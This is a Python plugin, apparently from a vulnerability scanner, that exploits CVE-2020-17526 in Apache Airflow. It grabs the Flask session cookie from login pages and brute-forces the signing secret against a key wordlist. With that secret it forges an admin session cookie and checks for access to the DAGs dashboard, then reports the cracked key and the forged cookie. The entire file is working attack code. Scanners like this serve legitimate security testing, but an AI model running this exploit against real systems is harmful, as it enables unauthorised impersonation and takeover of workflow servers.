#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from thirdparty import flask_unsign
import re

cve_2020_17526_payloads = [
    {
        'path': 'admin/airflow/login',
        'path2': 'admin/',
    },
    {
        'path': 'airflow/login',
        'path2': 'airflow/',
    },
    {
        'path': 'login',
        'path2': '',
    },
    {
        'path': '',
        'path2': '',
    }
]

def cve_2020_17526_scan(self, clients):
    ''' Airflow 使用默认会话密钥, 这会导致在启用身份验证时冒充任意用户 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'unAuthorized',
        'vul_id': 'CVE-2020-17526',
    }

    headers = {}

    for payload in cve_2020_17526_payloads:    # * Payload
        path = payload['path']                 # * Path

        res1 = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res1 is None:
            continue

        if ((res1.status_code == 200) and ('Set-Cookie' in res1.headers)):      # * 判断响应包中是否有Set-Cookie
            set_cookie = res1.headers['Set-Cookie']
            flask_cookie = re.search(r'.{76}\.{1}.{6}\.{1}.{27}', set_cookie)   # * 是否存在Flask Cookie
            if flask_cookie:
                cookie = flask_cookie.group()                                   # * 获取Flask Cookie
                c = flask_unsign.Cracker(cookie, quiet=True)                    # * 使用获取的Cookie创建Cracker对象
                file = open('lib/db/secretKey_fast.txt', encoding='utf-8')      # * secret密钥字典
                secretKeys = file.readlines()
                file.close()

                for key in range(len(secretKeys)):                              # * 去除\n
                    secretKeys[key] = secretKeys[key].replace('\n', '')

                secretKey = c.crack(secretKeys)                                 # * 开始暴破secret

                if secretKey:                                                   # * 如果暴破成功, 会返回密钥, 否则为None
                    session = flask_unsign.sign(                                # * 利用secret伪造session
                        {'user_id': '1', '_fresh': False, '_permanent': True},
                        secretKey
                    )
                    flask_session = {                                           # * 设置session
                        'Cookie': 'session=' + session
                    }
                    headers.update(flask_session)                               # * 更新headers
                    res2 = client.request(
                        'get',
                        payload['path2'],
                        headers=headers,
                        vul_info=vul_info
                    )
                    if res2 is None:
                        continue

                    if ((res2.status_code == 200) 
                        and (
                            ('<title>Airflow - DAGs</title>' in res2.text)
                            or (('Schedule' in res2.text) 
                                and ('Recent Tasks' in res2.text))
                            or (('const DAGS_INDEX =' in res2.text)
                                and ('window.location = DAGS_INDEX + "?search="+ encodeURI(search_query);' in res2.text))
                        )
                    ):
                        results = {
                            'Target': res2.request.url,
                            'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                            'Secret Key': secretKey,
                            'Cookie': flask_session['Cookie'],
                            # 'Request-1': res1,
                            'Request': res2
                        }
                        return results
    return None
